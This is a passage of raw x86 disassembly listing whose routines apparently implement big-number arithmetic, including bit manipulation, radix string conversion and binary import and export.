  403c46:	c0 eb 07             	shr    $0x7,%bl
  403c49:	e8 a7 fd ff ff       	call   0x4039f5
  403c4e:	85 c0                	test   %eax,%eax
  403c50:	0f 85 97 00 00 00    	jne    0x403ced
  403c56:	ff 77 04             	push   0x4(%edi)
  403c59:	55                   	push   %ebp
  403c5a:	e8 96 fd ff ff       	call   0x4039f5
  403c5f:	89 44 24 14          	mov    %eax,0x14(%esp)
  403c63:	85 c0                	test   %eax,%eax
  403c65:	0f 85 82 00 00 00    	jne    0x403ced
  403c6b:	8b 17                	mov    (%edi),%edx
  403c6d:	8b 4d 00             	mov    0x0(%ebp),%ecx
  403c70:	56                   	push   %esi
  403c71:	0f b6 f3             	movzbl %bl,%esi
  403c74:	33 db                	xor    %ebx,%ebx
  403c76:	43                   	inc    %ebx
  403c77:	0f af ce             	imul   %esi,%ecx
  403c7a:	2b de                	sub    %esi,%ebx
  403c7c:	89 74 24 14          	mov    %esi,0x14(%esp)
  403c80:	8b c3                	mov    %ebx,%eax
  403c82:	0f af c2             	imul   %edx,%eax
  403c85:	03 c8                	add    %eax,%ecx
  403c87:	8b c6                	mov    %esi,%eax
  403c89:	89 0f                	mov    %ecx,(%edi)
  403c8b:	33 f6                	xor    %esi,%esi
  403c8d:	8b 4d 00             	mov    0x0(%ebp),%ecx
  403c90:	0f af cb             	imul   %ebx,%ecx
  403c93:	0f af c2             	imul   %edx,%eax
  403c96:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  403c9a:	03 c8                	add    %eax,%ecx
  403c9c:	89 4d 00             	mov    %ecx,0x0(%ebp)
  403c9f:	39 77 04             	cmp    %esi,0x4(%edi)
  403ca2:	76 44                	jbe    0x403ce8
  403ca4:	8b 57 08             	mov    0x8(%edi),%edx
  403ca7:	8b 45 08             	mov    0x8(%ebp),%eax
  403caa:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403cae:	8b 34 b2             	mov    (%edx,%esi,4),%esi
  403cb1:	8b 0c 88             	mov    (%eax,%ecx,4),%ecx
  403cb4:	8b c6                	mov    %esi,%eax
  403cb6:	0f af 4c 24 14       	imul   0x14(%esp),%ecx
  403cbb:	0f af c3             	imul   %ebx,%eax
  403cbe:	03 c8                	add    %eax,%ecx
  403cc0:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403cc4:	89 0c 82             	mov    %ecx,(%edx,%eax,4)
  403cc7:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403ccb:	8b 55 08             	mov    0x8(%ebp),%edx
  403cce:	0f af ce             	imul   %esi,%ecx
  403cd1:	8b f0                	mov    %eax,%esi
  403cd3:	8b 04 b2             	mov    (%edx,%esi,4),%eax
  403cd6:	0f af c3             	imul   %ebx,%eax
  403cd9:	03 c8                	add    %eax,%ecx
  403cdb:	89 0c b2             	mov    %ecx,(%edx,%esi,4)
  403cde:	46                   	inc    %esi
  403cdf:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  403ce3:	3b 77 04             	cmp    0x4(%edi),%esi
  403ce6:	72 bc                	jb     0x403ca4
  403ce8:	8b 44 24 18          	mov    0x18(%esp),%eax
  403cec:	5e                   	pop    %esi
  403ced:	5b                   	pop    %ebx
  403cee:	5f                   	pop    %edi
  403cef:	5d                   	pop    %ebp
  403cf0:	c2 0c 00             	ret    $0xc
  403cf3:	56                   	push   %esi
  403cf4:	8b 74 24 08          	mov    0x8(%esp),%esi
  403cf8:	57                   	push   %edi
  403cf9:	6a 01                	push   $0x1
  403cfb:	56                   	push   %esi
  403cfc:	e8 f4 fc ff ff       	call   0x4039f5
  403d01:	8b f8                	mov    %eax,%edi
  403d03:	85 ff                	test   %edi,%edi
  403d05:	75 33                	jne    0x403d3a
  403d07:	8b 4e 04             	mov    0x4(%esi),%ecx
  403d0a:	c1 e1 02             	shl    $0x2,%ecx
  403d0d:	51                   	push   %ecx
  403d0e:	50                   	push   %eax
  403d0f:	ff 76 08             	push   0x8(%esi)
  403d12:	e8 30 e9 ff ff       	call   0x402647
  403d17:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403d1b:	83 c4 0c             	add    $0xc,%esp
  403d1e:	8b 4e 08             	mov    0x8(%esi),%ecx
  403d21:	99                   	cltd
  403d22:	33 c2                	xor    %edx,%eax
  403d24:	2b c2                	sub    %edx,%eax
  403d26:	89 01                	mov    %eax,(%ecx)
  403d28:	33 c0                	xor    %eax,%eax
  403d2a:	39 44 24 10          	cmp    %eax,0x10(%esp)
  403d2e:	0f 9d c0             	setge  %al
  403d31:	8d 04 45 ff ff ff ff 	lea    -0x1(,%eax,2),%eax
  403d38:	89 06                	mov    %eax,(%esi)
  403d3a:	8b c7                	mov    %edi,%eax
  403d3c:	5f                   	pop    %edi
  403d3d:	5e                   	pop    %esi
  403d3e:	c2 08 00             	ret    $0x8
  403d41:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403d45:	56                   	push   %esi
  403d46:	8b 74 24 08          	mov    0x8(%esp),%esi
  403d4a:	8b 46 04             	mov    0x4(%esi),%eax
  403d4d:	c1 e0 05             	shl    $0x5,%eax
  403d50:	3b c1                	cmp    %ecx,%eax
  403d52:	77 04                	ja     0x403d58
  403d54:	33 c0                	xor    %eax,%eax
  403d56:	eb 13                	jmp    0x403d6b
  403d58:	8b 46 08             	mov    0x8(%esi),%eax
  403d5b:	8b d1                	mov    %ecx,%edx
  403d5d:	c1 ea 05             	shr    $0x5,%edx
  403d60:	83 e1 1f             	and    $0x1f,%ecx
  403d63:	8b 04 90             	mov    (%eax,%edx,4),%eax
  403d66:	d3 e8                	shr    %cl,%eax
  403d68:	83 e0 01             	and    $0x1,%eax
  403d6b:	5e                   	pop    %esi
  403d6c:	c2 08 00             	ret    $0x8
  403d6f:	51                   	push   %ecx
  403d70:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403d74:	53                   	push   %ebx
  403d75:	8a 5c 24 14          	mov    0x14(%esp),%bl
  403d79:	83 e1 1f             	and    $0x1f,%ecx
  403d7c:	55                   	push   %ebp
  403d7d:	57                   	push   %edi
  403d7e:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403d82:	33 ed                	xor    %ebp,%ebp
  403d84:	c1 ef 05             	shr    $0x5,%edi
  403d87:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403d8b:	84 db                	test   %bl,%bl
  403d8d:	74 0a                	je     0x403d99
  403d8f:	80 fb 01             	cmp    $0x1,%bl
  403d92:	74 05                	je     0x403d99
  403d94:	6a fc                	push   $0xfffffffc
  403d96:	58                   	pop    %eax
  403d97:	eb 4c                	jmp    0x403de5
  403d99:	56                   	push   %esi
  403d9a:	8b 74 24 18          	mov    0x18(%esp),%esi
  403d9e:	8b 46 04             	mov    0x4(%esi),%eax
  403da1:	c1 e0 05             	shl    $0x5,%eax
  403da4:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  403da8:	77 1c                	ja     0x403dc6
  403daa:	84 db                	test   %bl,%bl
  403dac:	75 04                	jne    0x403db2
  403dae:	33 c0                	xor    %eax,%eax
  403db0:	eb 32                	jmp    0x403de4
  403db2:	8d 47 01             	lea    0x1(%edi),%eax
  403db5:	50                   	push   %eax
  403db6:	56                   	push   %esi
  403db7:	e8 39 fc ff ff       	call   0x4039f5
  403dbc:	8b e8                	mov    %eax,%ebp
  403dbe:	85 ed                	test   %ebp,%ebp
  403dc0:	75 20                	jne    0x403de2
  403dc2:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403dc6:	8b 76 08             	mov    0x8(%esi),%esi
  403dc9:	33 d2                	xor    %edx,%edx
  403dcb:	42                   	inc    %edx
  403dcc:	0f b6 c3             	movzbl %bl,%eax
  403dcf:	d3 e2                	shl    %cl,%edx
  403dd1:	f7 d2                	not    %edx
  403dd3:	d3 e0                	shl    %cl,%eax
  403dd5:	21 14 be             	and    %edx,(%esi,%edi,4)
  403dd8:	8b 54 24 18          	mov    0x18(%esp),%edx
  403ddc:	8b 52 08             	mov    0x8(%edx),%edx
  403ddf:	09 04 ba             	or     %eax,(%edx,%edi,4)
  403de2:	8b c5                	mov    %ebp,%eax
  403de4:	5e                   	pop    %esi
  403de5:	5f                   	pop    %edi
  403de6:	5d                   	pop    %ebp
  403de7:	5b                   	pop    %ebx
  403de8:	59                   	pop    %ecx
  403de9:	c2 0c 00             	ret    $0xc
  403dec:	53                   	push   %ebx
  403ded:	56                   	push   %esi
  403dee:	57                   	push   %edi
  403def:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403df3:	33 f6                	xor    %esi,%esi
  403df5:	33 d2                	xor    %edx,%edx
  403df7:	8b 5f 04             	mov    0x4(%edi),%ebx
  403dfa:	85 db                	test   %ebx,%ebx
  403dfc:	74 1c                	je     0x403e1a
  403dfe:	8b 7f 08             	mov    0x8(%edi),%edi
  403e01:	33 c9                	xor    %ecx,%ecx
  403e03:	8b 07                	mov    (%edi),%eax
  403e05:	d3 e8                	shr    %cl,%eax
  403e07:	a8 01                	test   $0x1,%al
  403e09:	75 17                	jne    0x403e22
  403e0b:	41                   	inc    %ecx
  403e0c:	46                   	inc    %esi
  403e0d:	83 f9 20             	cmp    $0x20,%ecx
  403e10:	72 f1                	jb     0x403e03
  403e12:	42                   	inc    %edx
  403e13:	83 c7 04             	add    $0x4,%edi
  403e16:	3b d3                	cmp    %ebx,%edx
  403e18:	72 e7                	jb     0x403e01
  403e1a:	33 c0                	xor    %eax,%eax
  403e1c:	5f                   	pop    %edi
  403e1d:	5e                   	pop    %esi
  403e1e:	5b                   	pop    %ebx
  403e1f:	c2 04 00             	ret    $0x4
  403e22:	8b c6                	mov    %esi,%eax
  403e24:	eb f6                	jmp    0x403e1c
  403e26:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403e2a:	56                   	push   %esi
  403e2b:	8b 71 04             	mov    0x4(%ecx),%esi
  403e2e:	85 f6                	test   %esi,%esi
  403e30:	75 04                	jne    0x403e36
  403e32:	33 c0                	xor    %eax,%eax
  403e34:	eb 29                	jmp    0x403e5f
  403e36:	4e                   	dec    %esi
  403e37:	74 11                	je     0x403e4a
  403e39:	8b 41 08             	mov    0x8(%ecx),%eax
  403e3c:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  403e3f:	83 38 00             	cmpl   $0x0,(%eax)
  403e42:	75 06                	jne    0x403e4a
  403e44:	83 e8 04             	sub    $0x4,%eax
  403e47:	4e                   	dec    %esi
  403e48:	75 f5                	jne    0x403e3f
  403e4a:	8b 41 08             	mov    0x8(%ecx),%eax
  403e4d:	ff 34 b0             	push   (%eax,%esi,4)
  403e50:	e8 ec 1d 00 00       	call   0x405c41
  403e55:	8d 4e 01             	lea    0x1(%esi),%ecx
  403e58:	c1 e1 05             	shl    $0x5,%ecx
  403e5b:	2b c8                	sub    %eax,%ecx
  403e5d:	8b c1                	mov    %ecx,%eax
  403e5f:	5e                   	pop    %esi
  403e60:	c2 04 00             	ret    $0x4
  403e63:	ff 74 24 04          	push   0x4(%esp)
  403e67:	e8 ba ff ff ff       	call   0x403e26
  403e6c:	83 c0 07             	add    $0x7,%eax
  403e6f:	c1 e8 03             	shr    $0x3,%eax
  403e72:	c2 04 00             	ret    $0x4
  403e75:	83 ec 10             	sub    $0x10,%esp
  403e78:	53                   	push   %ebx
  403e79:	55                   	push   %ebp
  403e7a:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  403e7e:	56                   	push   %esi
  403e7f:	57                   	push   %edi
  403e80:	8d 45 fe             	lea    -0x2(%ebp),%eax
  403e83:	83 f8 0e             	cmp    $0xe,%eax
  403e86:	0f 87 52 01 00 00    	ja     0x403fde
  403e8c:	8d 44 24 14          	lea    0x14(%esp),%eax
  403e90:	50                   	push   %eax
  403e91:	e8 11 fb ff ff       	call   0x4039a7
  403e96:	ff 74 24 2c          	push   0x2c(%esp)
  403e9a:	ff 15 c0 10 40 00    	call   *0x4010c0
  403ea0:	8b d8                	mov    %eax,%ebx
  403ea2:	83 fd 10             	cmp    $0x10,%ebp
  403ea5:	0f 85 a8 00 00 00    	jne    0x403f53
  403eab:	81 fb ff ff ff 3f    	cmp    $0x3fffffff,%ebx
  403eb1:	0f 87 27 01 00 00    	ja     0x403fde
  403eb7:	8b 74 24 24          	mov    0x24(%esp),%esi
  403ebb:	f6 c3 07             	test   $0x7,%bl
  403ebe:	6a 00                	push   $0x0
  403ec0:	59                   	pop    %ecx
  403ec1:	0f 95 c1             	setne  %cl
  403ec4:	c1 e8 03             	shr    $0x3,%eax
  403ec7:	25 ff ff ff 07       	and    $0x7ffffff,%eax
  403ecc:	03 c8                	add    %eax,%ecx
  403ece:	51                   	push   %ecx
  403ecf:	56                   	push   %esi
  403ed0:	e8 20 fb ff ff       	call   0x4039f5
  403ed5:	8b f8                	mov    %eax,%edi
  403ed7:	85 ff                	test   %edi,%edi
  403ed9:	0f 85 f1 00 00 00    	jne    0x403fd0
  403edf:	33 ed                	xor    %ebp,%ebp
  403ee1:	55                   	push   %ebp
  403ee2:	56                   	push   %esi
  403ee3:	e8 0b fe ff ff       	call   0x403cf3
  403ee8:	8b f8                	mov    %eax,%edi
  403eea:	85 ff                	test   %edi,%edi
  403eec:	0f 85 de 00 00 00    	jne    0x403fd0
  403ef2:	85 db                	test   %ebx,%ebx
  403ef4:	0f 84 d6 00 00 00    	je     0x403fd0
  403efa:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403efe:	83 fb 01             	cmp    $0x1,%ebx
  403f01:	75 05                	jne    0x403f08
  403f03:	80 38 2d             	cmpb   $0x2d,(%eax)
  403f06:	74 42                	je     0x403f4a
  403f08:	0f b6 44 03 ff       	movzbl -0x1(%ebx,%eax,1),%eax
  403f0d:	50                   	push   %eax
  403f0e:	6a 10                	push   $0x10
  403f10:	8d 44 24 18          	lea    0x18(%esp),%eax
  403f14:	50                   	push   %eax
  403f15:	e8 41 1d 00 00       	call   0x405c5b
  403f1a:	8b f8                	mov    %eax,%edi
  403f1c:	85 ff                	test   %edi,%edi
  403f1e:	0f 85 ac 00 00 00    	jne    0x403fd0
  403f24:	8b 44 24 24          	mov    0x24(%esp),%eax
  403f28:	8b cd                	mov    %ebp,%ecx
  403f2a:	8b f5                	mov    %ebp,%esi
  403f2c:	83 e1 07             	and    $0x7,%ecx
  403f2f:	c1 ee 03             	shr    $0x3,%esi
  403f32:	c1 e1 02             	shl    $0x2,%ecx
  403f35:	8b 50 08             	mov    0x8(%eax),%edx
  403f38:	8b 44 24 10          	mov    0x10(%esp),%eax
  403f3c:	d3 e0                	shl    %cl,%eax
  403f3e:	09 04 b2             	or     %eax,(%edx,%esi,4)
  403f41:	45                   	inc    %ebp
  403f42:	4b                   	dec    %ebx
  403f43:	75 b5                	jne    0x403efa
  403f45:	e9 86 00 00 00       	jmp    0x403fd0
  403f4a:	8b 44 24 24          	mov    0x24(%esp),%eax
  403f4e:	83 08 ff             	orl    $0xffffffff,(%eax)
  403f51:	eb 7d                	jmp    0x403fd0
  403f53:	8b 74 24 24          	mov    0x24(%esp),%esi
  403f57:	33 ed                	xor    %ebp,%ebp
  403f59:	55                   	push   %ebp
  403f5a:	56                   	push   %esi
  403f5b:	e8 93 fd ff ff       	call   0x403cf3
  403f60:	8b f8                	mov    %eax,%edi
  403f62:	85 ff                	test   %edi,%edi
  403f64:	75 6a                	jne    0x403fd0
  403f66:	85 db                	test   %ebx,%ebx
  403f68:	74 66                	je     0x403fd0
  403f6a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403f6e:	85 ed                	test   %ebp,%ebp
  403f70:	75 0a                	jne    0x403f7c
  403f72:	80 38 2d             	cmpb   $0x2d,(%eax)
  403f75:	75 05                	jne    0x403f7c
  403f77:	83 0e ff             	orl    $0xffffffff,(%esi)
  403f7a:	eb 4f                	jmp    0x403fcb
  403f7c:	0f b6 04 28          	movzbl (%eax,%ebp,1),%eax
  403f80:	50                   	push   %eax
  403f81:	ff 74 24 2c          	push   0x2c(%esp)
  403f85:	8d 44 24 18          	lea    0x18(%esp),%eax
  403f89:	50                   	push   %eax
  403f8a:	e8 cc 1c 00 00       	call   0x405c5b
  403f8f:	8b f8                	mov    %eax,%edi
  403f91:	85 ff                	test   %edi,%edi
  403f93:	75 3b                	jne    0x403fd0
  403f95:	ff 74 24 28          	push   0x28(%esp)
  403f99:	8d 44 24 18          	lea    0x18(%esp),%eax
  403f9d:	56                   	push   %esi
  403f9e:	50                   	push   %eax
  403f9f:	e8 4b 09 00 00       	call   0x4048ef
  403fa4:	8b f8                	mov    %eax,%edi
  403fa6:	85 ff                	test   %edi,%edi
  403fa8:	75 26                	jne    0x403fd0
  403faa:	83 3e 01             	cmpl   $0x1,(%esi)
  403fad:	8d 44 24 14          	lea    0x14(%esp),%eax
  403fb1:	ff 74 24 10          	push   0x10(%esp)
  403fb5:	50                   	push   %eax
  403fb6:	56                   	push   %esi
  403fb7:	75 07                	jne    0x403fc0
  403fb9:	e8 77 07 00 00       	call   0x404735
  403fbe:	eb 05                	jmp    0x403fc5
  403fc0:	e8 b5 07 00 00       	call   0x40477a
  403fc5:	8b f8                	mov    %eax,%edi
  403fc7:	85 ff                	test   %edi,%edi
  403fc9:	75 05                	jne    0x403fd0
  403fcb:	45                   	inc    %ebp
  403fcc:	3b eb                	cmp    %ebx,%ebp
  403fce:	72 9a                	jb     0x403f6a
  403fd0:	8d 44 24 14          	lea    0x14(%esp),%eax
  403fd4:	50                   	push   %eax
  403fd5:	e8 e6 f9 ff ff       	call   0x4039c0
  403fda:	8b c7                	mov    %edi,%eax
  403fdc:	eb 03                	jmp    0x403fe1
  403fde:	6a fc                	push   $0xfffffffc
  403fe0:	58                   	pop    %eax
  403fe1:	5f                   	pop    %edi
  403fe2:	5e                   	pop    %esi
  403fe3:	5d                   	pop    %ebp
  403fe4:	5b                   	pop    %ebx
  403fe5:	83 c4 10             	add    $0x10,%esp
  403fe8:	c2 0c 00             	ret    $0xc
  403feb:	83 ec 18             	sub    $0x18,%esp
  403fee:	53                   	push   %ebx
  403fef:	55                   	push   %ebp
  403ff0:	57                   	push   %edi
  403ff1:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  403ff5:	33 db                	xor    %ebx,%ebx
  403ff7:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  403ffb:	8d 47 fe             	lea    -0x2(%edi),%eax
  403ffe:	83 f8 0e             	cmp    $0xe,%eax
  404001:	0f 87 66 01 00 00    	ja     0x40416d
  404007:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  40400b:	55                   	push   %ebp
  40400c:	e8 15 fe ff ff       	call   0x403e26
  404011:	8b c8                	mov    %eax,%ecx
  404013:	83 ff 04             	cmp    $0x4,%edi
  404016:	7c 02                	jl     0x40401a
  404018:	d1 e9                	shr    $1,%ecx
  40401a:	83 ff 10             	cmp    $0x10,%edi
  40401d:	7c 02                	jl     0x404021
  40401f:	d1 e9                	shr    $1,%ecx
  404021:	83 c1 03             	add    $0x3,%ecx
  404024:	39 4c 24 34          	cmp    %ecx,0x34(%esp)
  404028:	73 0d                	jae    0x404037
  40402a:	8b 44 24 38          	mov    0x38(%esp),%eax
  40402e:	6a f8                	push   $0xfffffff8
  404030:	89 08                	mov    %ecx,(%eax)
  404032:	e9 38 01 00 00       	jmp    0x40416f
  404037:	56                   	push   %esi
  404038:	8b 74 24 34          	mov    0x34(%esp),%esi
  40403c:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404040:	50                   	push   %eax
  404041:	89 74 24 34          	mov    %esi,0x34(%esp)
  404045:	e8 5d f9 ff ff       	call   0x4039a7
  40404a:	83 7d 00 ff          	cmpl   $0xffffffff,0x0(%ebp)
  40404e:	75 0e                	jne    0x40405e
  404050:	8b c6                	mov    %esi,%eax
  404052:	c6 00 2d             	movb   $0x2d,(%eax)
  404055:	8b 74 24 30          	mov    0x30(%esp),%esi
  404059:	46                   	inc    %esi
  40405a:	89 74 24 30          	mov    %esi,0x30(%esp)
  40405e:	83 ff 10             	cmp    $0x10,%edi
  404061:	0f 85 a7 00 00 00    	jne    0x40410e
  404067:	21 5c 24 2c          	and    %ebx,0x2c(%esp)
  40406b:	8b 7d 04             	mov    0x4(%ebp),%edi
  40406e:	85 ff                	test   %edi,%edi
  404070:	0f 84 d2 00 00 00    	je     0x404148
  404076:	83 c9 ff             	or     $0xffffffff,%ecx
  404079:	8d 57 04             	lea    0x4(%edi),%edx
  40407c:	6a 04                	push   $0x4
  40407e:	2b cf                	sub    %edi,%ecx
  404080:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  404084:	5b                   	pop    %ebx
  404085:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  404089:	8b 45 08             	mov    0x8(%ebp),%eax
  40408c:	03 ca                	add    %edx,%ecx
  40408e:	c1 e1 03             	shl    $0x3,%ecx
  404091:	8b 44 b8 fc          	mov    -0x4(%eax,%edi,4),%eax
  404095:	d3 e8                	shr    %cl,%eax
  404097:	25 ff 00 00 00       	and    $0xff,%eax
  40409c:	89 44 24 10          	mov    %eax,0x10(%esp)
  4040a0:	75 0c                	jne    0x4040ae
  4040a2:	83 7c 24 2c 00       	cmpl   $0x0,0x2c(%esp)
  4040a7:	75 05                	jne    0x4040ae
  4040a9:	83 fa 02             	cmp    $0x2,%edx
  4040ac:	75 47                	jne    0x4040f5
  4040ae:	99                   	cltd
  4040af:	83 e2 0f             	and    $0xf,%edx
  4040b2:	03 c2                	add    %edx,%eax
  4040b4:	c1 f8 04             	sar    $0x4,%eax
  4040b7:	8a 80 4c 19 40 00    	mov    0x40194c(%eax),%al
  4040bd:	88 06                	mov    %al,(%esi)
  4040bf:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4040c3:	8b 44 24 10          	mov    0x10(%esp),%eax
  4040c7:	41                   	inc    %ecx
  4040c8:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  4040cc:	25 0f 00 00 80       	and    $0x8000000f,%eax
  4040d1:	79 05                	jns    0x4040d8
  4040d3:	48                   	dec    %eax
  4040d4:	83 c8 f0             	or     $0xfffffff0,%eax
  4040d7:	40                   	inc    %eax
  4040d8:	8a 80 4c 19 40 00    	mov    0x40194c(%eax),%al
  4040de:	8b 54 24 38          	mov    0x38(%esp),%edx
  4040e2:	88 01                	mov    %al,(%ecx)
  4040e4:	8b 74 24 30          	mov    0x30(%esp),%esi
  4040e8:	46                   	inc    %esi
  4040e9:	c7 44 24 2c 01 00 00 	movl   $0x1,0x2c(%esp)
  4040f0:	00 
  4040f1:	89 74 24 30          	mov    %esi,0x30(%esp)
  4040f5:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4040f9:	4a                   	dec    %edx
  4040fa:	89 54 24 38          	mov    %edx,0x38(%esp)
  4040fe:	4b                   	dec    %ebx
  4040ff:	75 88                	jne    0x404089
  404101:	4f                   	dec    %edi
  404102:	0f 85 6e ff ff ff    	jne    0x404076
  404108:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40410c:	eb 3a                	jmp    0x404148
  40410e:	55                   	push   %ebp
  40410f:	8d 44 24 20          	lea    0x20(%esp),%eax
  404113:	50                   	push   %eax
  404114:	e8 d1 f9 ff ff       	call   0x403aea
  404119:	8b d8                	mov    %eax,%ebx
  40411b:	85 db                	test   %ebx,%ebx
  40411d:	75 3f                	jne    0x40415e
  40411f:	83 7c 24 1c ff       	cmpl   $0xffffffff,0x1c(%esp)
  404124:	75 08                	jne    0x40412e
  404126:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  40412d:	00 
  40412e:	8d 44 24 30          	lea    0x30(%esp),%eax
  404132:	50                   	push   %eax
  404133:	57                   	push   %edi
  404134:	8d 44 24 24          	lea    0x24(%esp),%eax
  404138:	50                   	push   %eax
  404139:	e8 69 1b 00 00       	call   0x405ca7
  40413e:	8b d8                	mov    %eax,%ebx
  404140:	85 db                	test   %ebx,%ebx
  404142:	75 1a                	jne    0x40415e
  404144:	8b 74 24 30          	mov    0x30(%esp),%esi
  404148:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40414c:	c6 06 00             	movb   $0x0,(%esi)
  40414f:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  404153:	41                   	inc    %ecx
  404154:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  404158:	2b 4c 24 34          	sub    0x34(%esp),%ecx
  40415c:	89 08                	mov    %ecx,(%eax)
  40415e:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404162:	50                   	push   %eax
  404163:	e8 58 f8 ff ff       	call   0x4039c0
  404168:	8b c3                	mov    %ebx,%eax
  40416a:	5e                   	pop    %esi
  40416b:	eb 03                	jmp    0x404170
  40416d:	6a fc                	push   $0xfffffffc
  40416f:	58                   	pop    %eax
  404170:	5f                   	pop    %edi
  404171:	5d                   	pop    %ebp
  404172:	5b                   	pop    %ebx
  404173:	83 c4 18             	add    $0x18,%esp
  404176:	c2 14 00             	ret    $0x14
  404179:	53                   	push   %ebx
  40417a:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40417e:	55                   	push   %ebp
  40417f:	56                   	push   %esi
  404180:	33 ed                	xor    %ebp,%ebp
  404182:	57                   	push   %edi
  404183:	8b fd                	mov    %ebp,%edi
  404185:	85 db                	test   %ebx,%ebx
  404187:	74 0f                	je     0x404198
  404189:	8b 44 24 18          	mov    0x18(%esp),%eax
  40418d:	80 3c 07 00          	cmpb   $0x0,(%edi,%eax,1)
  404191:	75 05                	jne    0x404198
  404193:	47                   	inc    %edi
  404194:	3b fb                	cmp    %ebx,%edi
  404196:	72 f5                	jb     0x40418d
  404198:	8b 74 24 14          	mov    0x14(%esp),%esi
  40419c:	8b cb                	mov    %ebx,%ecx
  40419e:	2b cf                	sub    %edi,%ecx
  4041a0:	6a 00                	push   $0x0
  4041a2:	58                   	pop    %eax
  4041a3:	f6 c1 03             	test   $0x3,%cl
  4041a6:	0f 95 c0             	setne  %al
  4041a9:	c1 e9 02             	shr    $0x2,%ecx
  4041ac:	03 c1                	add    %ecx,%eax
  4041ae:	50                   	push   %eax
  4041af:	56                   	push   %esi
  4041b0:	e8 40 f8 ff ff       	call   0x4039f5
  4041b5:	85 c0                	test   %eax,%eax
  4041b7:	75 3f                	jne    0x4041f8
  4041b9:	55                   	push   %ebp
  4041ba:	56                   	push   %esi
  4041bb:	e8 33 fb ff ff       	call   0x403cf3
  4041c0:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4041c4:	85 c0                	test   %eax,%eax
  4041c6:	75 30                	jne    0x4041f8
  4041c8:	3b df                	cmp    %edi,%ebx
  4041ca:	76 2c                	jbe    0x4041f8
  4041cc:	8b 44 24 14          	mov    0x14(%esp),%eax
  4041d0:	8b cd                	mov    %ebp,%ecx
  4041d2:	83 e1 03             	and    $0x3,%ecx
  4041d5:	8b f5                	mov    %ebp,%esi
  4041d7:	c1 ee 02             	shr    $0x2,%esi
  4041da:	c1 e1 03             	shl    $0x3,%ecx
  4041dd:	8b 50 08             	mov    0x8(%eax),%edx
  4041e0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4041e4:	0f b6 44 18 ff       	movzbl -0x1(%eax,%ebx,1),%eax
  4041e9:	d3 e0                	shl    %cl,%eax
  4041eb:	09 04 b2             	or     %eax,(%edx,%esi,4)
  4041ee:	4b                   	dec    %ebx
  4041ef:	45                   	inc    %ebp
  4041f0:	3b df                	cmp    %edi,%ebx
  4041f2:	77 d8                	ja     0x4041cc
  4041f4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4041f8:	5f                   	pop    %edi
  4041f9:	5e                   	pop    %esi
  4041fa:	5d                   	pop    %ebp
  4041fb:	5b                   	pop    %ebx
  4041fc:	c2 0c 00             	ret    $0xc
  4041ff:	55                   	push   %ebp
  404200:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  404204:	56                   	push   %esi
  404205:	57                   	push   %edi
  404206:	55                   	push   %ebp
  404207:	e8 57 fc ff ff       	call   0x403e63
  40420c:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404210:	8b f0                	mov    %eax,%esi
  404212:	3b fe                	cmp    %esi,%edi
  404214:	73 05                	jae    0x40421b
  404216:	6a f8                	push   $0xfffffff8
  404218:	58                   	pop    %eax
  404219:	eb 39                	jmp    0x404254
  40421b:	53                   	push   %ebx
  40421c:	57                   	push   %edi
  40421d:	33 db                	xor    %ebx,%ebx
  40421f:	53                   	push   %ebx
  404220:	ff 74 24 20          	push   0x20(%esp)
  404224:	e8 1e e4 ff ff       	call   0x402647
  404229:	83 c4 0c             	add    $0xc,%esp
  40422c:	85 f6                	test   %esi,%esi
  40422e:	74 21                	je     0x404251
  404230:	4f                   	dec    %edi
  404231:	03 7c 24 18          	add    0x18(%esp),%edi
  404235:	8b 45 08             	mov    0x8(%ebp),%eax
  404238:	8b d3                	mov    %ebx,%edx
  40423a:	c1 ea 02             	shr    $0x2,%edx
  40423d:	8b cb                	mov    %ebx,%ecx
  40423f:	83 e1 03             	and    $0x3,%ecx
  404242:	c1 e1 03             	shl    $0x3,%ecx
  404245:	8b 04 90             	mov    (%eax,%edx,4),%eax
  404248:	d3 e8                	shr    %cl,%eax
  40424a:	43                   	inc    %ebx
  40424b:	88 07                	mov    %al,(%edi)
  40424d:	4f                   	dec    %edi
  40424e:	4e                   	dec    %esi
  40424f:	75 e4                	jne    0x404235
  404251:	33 c0                	xor    %eax,%eax
  404253:	5b                   	pop    %ebx
  404254:	5f                   	pop    %edi
  404255:	5e                   	pop    %esi
  404256:	5d                   	pop    %ebp
  404257:	c2 0c 00             	ret    $0xc
  40425a:	51                   	push   %ecx
  40425b:	53                   	push   %ebx
  40425c:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  404260:	55                   	push   %ebp
